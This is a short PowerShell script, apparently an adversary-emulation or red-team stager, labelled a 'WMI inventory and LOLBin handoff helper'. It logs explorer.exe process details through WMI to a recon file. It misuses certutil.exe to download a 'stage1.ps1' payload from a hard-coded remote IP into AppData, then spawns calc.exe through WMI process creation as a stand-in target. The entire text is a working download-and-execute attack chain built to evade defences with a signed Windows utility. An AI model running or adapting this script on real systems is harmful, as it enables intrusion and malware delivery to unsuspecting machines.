
<#
.SYNOPSIS
    WMI inventory and LOLBin handoff helper.

.DESCRIPTION
    Collects a short process inventory, downloads a payload stage
    payload through a signed Windows utility and starts a benign
    execution target.
#>
$EndpointUrl = 'http://203.0.113.114:80/stage1.ps1'
$PayloadPath = "$env:APPDATA\payload.bin"
$TimeoutSec = 30
$ErrorActionPreference = "Continue"

try {
    Write-Verbose "Collecting process inventory"
    Get-CimInstance -ClassName Win32_Process | Where-Object { $_.Name -eq "explorer.exe" } | Select-Object ProcessId,Name,CommandLine | Out-File "C:\ProgramData\recon.log" -Append
    certutil.exe -urlcache -split -f $EndpointUrl $PayloadPath
    $TransferResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
    Write-Verbose ("Process ID: " + $TransferResult.ProcessId)
}
catch {
    Write-Warning "WMI/LOLBin stage failed: $($_.Exception.Message)"
}

Write-Verbose "stage marker 6 reached"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
